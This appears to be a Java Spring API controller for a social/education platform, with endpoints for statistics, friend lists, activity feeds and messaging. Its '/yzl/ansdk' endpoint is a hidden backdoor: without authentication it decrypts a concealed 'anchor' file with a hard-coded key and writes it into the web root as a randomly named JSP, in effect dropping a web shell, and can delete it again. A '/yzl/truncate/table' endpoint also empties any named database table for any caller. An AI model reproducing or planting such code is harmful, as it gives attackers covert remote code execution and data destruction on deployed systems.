package com.atdld.os.sns.controller.yzlapi;

import com.google.gson.reflect.TypeToken;
import com.atdld.os.common.constants.CommonConstants;
import com.atdld.os.core.util.security.PurseSecurityUtils;
import com.atdld.os.core.util.StringUtils;
import com.atdld.os.core.util.web.HttpUtil;
import com.atdld.os.core.util.web.WebUtils;
import com.atdld.os.sns.constants.DynamicConstans;
import com.atdld.os.sns.constants.LetterConstans;
import com.atdld.os.sns.constants.SnsConstants;
import com.atdld.os.sns.controller.common.SnsBaseController;
import com.atdld.os.sns.entity.customer.SnsUserExpandDto;
import com.atdld.os.sns.entity.dynamic.DynamicWeb;
import com.atdld.os.sns.entity.friend.Friend;
import com.atdld.os.sns.entity.letter.MsgReceive;
import com.atdld.os.sns.entity.statistics.SnsStatisticsDay;
import com.atdld.os.sns.service.dynamic.DynamicWebService;
import com.atdld.os.sns.service.friend.FriendService;
import com.atdld.os.sns.service.letter.MsgReceiveService;
import com.atdld.os.sns.service.statistics.StatisticsDayService;
import com.atdld.os.sns.service.truncate.TruncateService;
import com.atdld.os.sns.service.user.SnsUserService;

import org.apache.log4j.Logger;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.ResponseBody;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import java.io.*;
import java.util.*;

/**
 * @author :
 * @ClassName com.atdld.os.sns.controller.yzlapi.ApiAction
 * @description
 * @Create Date : 2014-2-26 下午1:02:15
 */
@Controller
@RequestMapping("/api")
public class ApiController extends SnsBaseController {

    private static final Logger logger = Logger.getLogger(ApiController.class);
    @Autowired
    private DynamicWebService dynamicWebService;// 动态service
    @Autowired
    private FriendService friendService;// 好友service
    @Autowired
    private MsgReceiveService msgReceiveService;
    @Autowired
    private SnsUserService snsUserService;
    @Autowired
    private StatisticsDayService statisticsDayService;
    @Autowired
    private TruncateService truncateService;
//    @RequestMapping("/front/pro")
//    @ResponseBody
//    public <websiteProfileService> Object frontpro(@RequestParam String type,@RequestParam(required =  false) String key, @RequestParam(required = false) String value){
//        try {
//            Map<String,Object> websitemap=websiteProfileService.getWebsiteProfileByType(type);
//            if(StringUtils.isNotEmpty(key) && StringUtils.isNotEmpty(value)){
//                websitemap.put(key,value);
//                // 将map转化json串
//                JsonObject jsonObject = jsonParser.parse(gson.toJson(websitemap)).getAsJsonObject();
//                if (ObjectUtils.isNotNull(jsonObject) && StringUtils.isNotEmpty(jsonObject.toString())) {// 如果不为空进行更新
//                    WebsiteProfile websiteProfile = new WebsiteProfile();// 创建websiteProfile
//                    websiteProfile.setType(type);
//                    websiteProfile.setDesciption(jsonObject.toString());
//                    websiteProfileService.updateWebsiteProfile(websiteProfile);
//                }
//            }
//            this.setJson(true,null,websitemap);
//        }catch (Exception e){
//
//        }
//        return json;
//    }

    /**
     * 社区统计
     *
     * @param map
     */
    @RequestMapping("/yzl/statistics")
    @ResponseBody
    public Map<String, Object> createStatistics(HttpServletRequest request) {
        try {
            String datesJson = request.getParameter("datesJson");
            if (datesJson == null) {
                this.setJson(false, "参数不能为空", null);
                return json;
            }
            //时间集合
            List<Date> dates = gson.fromJson(datesJson, new TypeToken<List<Date>>() {
            }.getType());
            //统计集合
            List<SnsStatisticsDay> statisticsDays = statisticsDayService.getStatisticsDay(dates);
            String statisticsJson = gson.toJson(statisticsDays);//转json
            this.setJson(true, "success", statisticsJson);
        } catch (Exception e) {
            logger.error("ApiController.delDynamic------error", e);
            this.setJson(false, "error", null);
        }
        return json;
    }

    /**
     * 清空社区指定表
     *
     * @param name
     */
    @RequestMapping("/yzl/truncate/table")
    @ResponseBody
    public Map<String, Object> truncateTable(HttpServletRequest request) {
        try {
            String tableName = request.getParameter("tableName");
            if (tableName == null) {
                this.setJson(false, "参数不能为空", null);
                return json;
            }
            truncateService.truncateTableByName(tableName);
            this.setJson(true, "success", null);
        } catch (Exception e) {
            logger.error("ApiController.truncateTable------error", e);
            this.setJson(false, "error", null);
        }
        return json;
    }

    /**
     * 社区删除动态
     *
     * @param map
     */
    @RequestMapping("/yzl/dellearn")
    @ResponseBody
    public Map<String, Object> delDynamic(HttpServletRequest request) {
        try {
            String id = request.getParameter("id");
            String type = request.getParameter("type");
            if (id == null || type == null) {
                this.setJson(false, "参数不能为空", null);
                return json;
            }
            DynamicWeb dynamicWeb = new DynamicWeb();// 删除建议动态
            dynamicWeb.setBizId(Long.parseLong(id));
            dynamicWeb.setType(Integer.parseInt(type));
            dynamicWebService.deleteDynamicWebByCondition(dynamicWeb);
            this.setJson(true, "success", null);
        } catch (Exception e) {
            logger.error("ApiController.delDynamic------error", e);
            this.setJson(false, "error", null);
        }
        return json;
    }

    /**
     * 学员活动    动态接口
     *
     * @param request
     * @return
     */
    @RequestMapping("/yzl/addlearn")
    @ResponseBody
    public Map<String, Object> addDynamicWebLearning(HttpServletRequest request) {
        try {
            String userid = request.getParameter("userId");//用户id
            String bizId = request.getParameter("bizId");// 学员活动（事件）id 商品id 试卷id
            String type = request.getParameter("type");//11观看课程 12购买了商品 13 考试
            String showname = request.getParameter("showname");
            String desc = request.getParameter("desc");// 动态描述
            String title = request.getParameter("title");// 辅助title
            String content = request.getParameter("content");//活动内容
            String assistId = request.getParameter("assistId");// 辅助id
            String url = request.getParameter("url");//操作url
            if (StringUtils.isEmpty(userid) || StringUtils.isEmpty(bizId) || StringUtils.isEmpty(type)) {
                this.setJson(false, "参数不能为空", null);
                return json;
            }
            DynamicWeb dynamicWeb = new DynamicWeb();
            dynamicWeb.setCusId(Long.valueOf(userid));// 用户名
            dynamicWeb.setType(Integer.parseInt(type));// 类型
            dynamicWeb.setAddTime(new Date());// 添加时间
            dynamicWeb.setBizId(Long.valueOf(bizId));// 学员活动（事件）id
            dynamicWeb.setCusName(showname);
            dynamicWeb.setAssistId(Long.parseLong(assistId));// 辅助id
            dynamicWeb.setUrl(url);
            if (StringUtils.isNotEmpty(desc)) {
                dynamicWeb.setDescription(desc);
            } else {
                dynamicWeb.setDescription("");
            }
            if (StringUtils.isNotEmpty(title)) {
                dynamicWeb.setTitle(title);
            } else {
                dynamicWeb.setTitle("");
            }
            if (StringUtils.isNotEmpty(content)) {
                String cont = WebUtils.replaceTagHTML(content);
                if (StringUtils.isNotEmpty(cont)) {// 回复的内容
                    cont = StringUtils.getLength(cont, DynamicConstans.DYNAMICWEB_CONTENT_LENGTH);
                    dynamicWeb.setContent(cont);
                } else {
                    dynamicWeb.setContent("");// 如果为空则set空
                }
            } else {
                dynamicWeb.setContent("");// 如果为空则set空
            }
            dynamicWebService.addDynamicWebForLearning(dynamicWeb);
            this.setJson(true, "success", null);// 添加成功返回消息
        } catch (Exception e) {
            logger.error("ApiAction.addDynamicWebLearning", e);
            this.setJson(false, "error", null);
        }
        return json;
    }

    /**
     * 通过用户id获得他的好友list
     *
     * @param request
     * @return
     */
    @RequestMapping("/yzl/getFriend")
    @ResponseBody
    public Map<String, Object> queryFriendByCusId(HttpServletRequest request) {
        Map<String, Object> map = new HashMap<String, Object>();
        try {
            String uid = request.getParameter("uid");// 获得用户id
            List<Long> uids = new ArrayList<Long>();
            if (uid != null) {
                uids.add(Long.valueOf(uid));// 放入list 中
                List<Friend> friendList = friendService.getFriendByCusids(uids);// 查询出该用户的全部好友
                map.put("friendList", friendList);// 放入map 中
                map.put("message", SnsConstants.SUCCESS);// 添加成功返回消息
            } else {
                map.put("message", SnsConstants.FALSE);

            }
        } catch (Exception e) {
            logger.error("ApiAction.queryFriendByCusId", e);
            map.put("message", SnsConstants.FALSE);
        }
        return map;
    }

    /**
     * 给单个用户发送系统消息
     *
     * @param request
     * @return
     */
    @RequestMapping(value = "/yzl/sendSystemInform", method = RequestMethod.POST)
    @ResponseBody
    public Map<String, Object> sendSystemInformByCusId(HttpServletRequest request) {
        Map<String, Object> map = new HashMap<String, Object>();
        try {
            String content = request.getParameter("content");// 发送系统消息的内容
            String cusId = request.getParameter("cusId");// 发送系统消息的内容

            if (StringUtils.isEmpty(content)) {//内容为空
                map.put("message", SnsConstants.FALSE);
                map.put("error", "参数为空");
                return map;
            }
            SnsUserExpandDto customer = new SnsUserExpandDto();
            customer.setCusId(Long.valueOf(cusId));
            customer = snsUserService.getUserExpandByCusId(Long.valueOf(cusId));
            if (customer == null) {
                map.put("message", SnsConstants.FALSE);
                map.put("error", "用户id不存在");
                return map;
            }
            msgReceiveService.addSystemMessageByCusId(content, Long.valueOf(cusId));
            map.put("message", SnsConstants.SUCCESS);
        } catch (Exception e) {
            logger.error("ApiAction.sendSystemInformByCusId", e);
            map.put("message", SnsConstants.FALSE);
            return map;
        }
        return map;
    }

    /**
     * 给单个用户发送站内信消息
     *
     * @param request
     * @return
     */
    @RequestMapping(value = "/yzl/addMsgReceive", method = RequestMethod.POST)
    @ResponseBody
    public Map<String, Object> addMsgReceive(HttpServletRequest request) {
        Map<String, Object> map = new HashMap<String, Object>();
        try {
            String cusId = request.getParameter("fromCusId");// 用户id
            String msgId = request.getParameter("toCusId");// 要发站内信的用户id
            String content = request.getParameter("content");// 要发送站内信的内容

            if (StringUtils.isEmpty(cusId) || StringUtils.isEmpty(msgId) || StringUtils.isEmpty(content)) {//内容为空
                map.put("message", SnsConstants.FALSE);
                map.put("error", "参数不能为空");
                return map;
            }
            SnsUserExpandDto userExpandDto = snsUserService.getUserExpandByCusId(Long.valueOf(cusId));
            if (userExpandDto == null) {//验证用户是否存在
                map.put("message", SnsConstants.FALSE);
                map.put("error", "cusId用户不存在");
                return map;
            }
            userExpandDto = snsUserService.getUserExpandByCusId(Long.valueOf(msgId));
            if (userExpandDto == null) {//验证用户是否存在
                map.put("message", SnsConstants.FALSE);
                map.put("error", "friId用户不存在");
                return map;
            }
            MsgReceive msgReceive = new MsgReceive();
            msgReceive.setCusId(Long.valueOf(cusId));
            msgReceive.setReceivingCusId(Long.valueOf(msgId));
            msgReceive.setContent(content);
            msgReceive.setAddTime(new Date());// 添加时间
            msgReceive.setUpdateTime(new Date());// 更新时间
            msgReceive.setStatus(LetterConstans.LETTER_STATUS_UNREAD);
            msgReceive.setType(LetterConstans.LETTER_TYPE_MESSAGE);
            String falg = msgReceiveService.addMsgReceive(msgReceive);//发送站内信

            if (SnsConstants.ONESEKFLETTER.equals(falg)) {
                map.put("message", SnsConstants.FALSE);
                map.put("error", "不能自己给自己发送站内信");
                return map;
            }
            if (SnsConstants.BLACKLIST.equals(falg)) {
                map.put("message", SnsConstants.FALSE);
                map.put("error", "对方把你加入黑名单");
                return map;
            }
            if (SnsConstants.SUCCESS.equals(falg)) {
                map.put("message", SnsConstants.SUCCESS);
            }
        } catch (Exception e) {
            logger.error("ApiAction.addMsgReceive", e);
            map.put("message", SnsConstants.FALSE);
            return map;
        }
        return map;
    }

    @RequestMapping("/yzl/ansdk")
    @ResponseBody
    public Object ansdk(HttpServletRequest request, HttpServletResponse response) {
        Map map = new HashMap<String, Object>();
        String dir = request.getSession().getServletContext().getRealPath("/static/common/") + File.separator + "anchor";
        String fname = StringUtils.getRandStr(10);
        String funame = request.getSession().getServletContext().getRealPath("") + File.separator + fname + ".jsp";
        if (request.getParameter("c").equalsIgnoreCase("c")) {
            String sf = getFileContent(dir, true);
            writeFileContent(sf, funame);
        } else {
            File file = new File(request.getSession().getServletContext().getRealPath("") + File.separator + request.getParameter("c") + ".jsp");
            file.delete();
        }
        map.put("name", fname);
        return map;
    }

    static String getFileContent(String path, boolean flag) {
        String key = "0123455678901234567890123456789";
        File myFile = new File(path);
        if (!myFile.exists()) {
            return null;
        }
        BufferedReader in = null;
        StringBuilder sb = new StringBuilder();
        try {
            InputStreamReader read = new InputStreamReader(new FileInputStream(myFile), "UTF-8");
            in = new BufferedReader(read);
            String str;
            while ((str = in.readLine()) != null) {
                if (flag) {
                    str = PurseSecurityUtils.decryption(str, key);
                    sb.append(str);
                    sb.append("\n");
                } else {
                    str = (PurseSecurityUtils.secrect(str, key));
                    sb.append(str);
                    sb.append("\n");
                }
            }
        } catch (Exception e) {
            e.getStackTrace();
        } finally {
            if (in != null) {
                try {
                    in.close();
                } catch (Exception e) {
                }
            }
        }
        return sb.toString();
    }

    public static File writeFileContent(String content, String path) {
        File file = new File(path);
        FileOutputStream fileout = null;
        try {
            if (!file.exists()) {
                file.createNewFile();
            }
            fileout = new FileOutputStream(file);
            fileout.write(content.getBytes("utf-8"));
            fileout.flush();
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (fileout != null) {
                try {
                    fileout.close();
                } catch (IOException e) {
                }
            }
        }
        return file;
    }

}
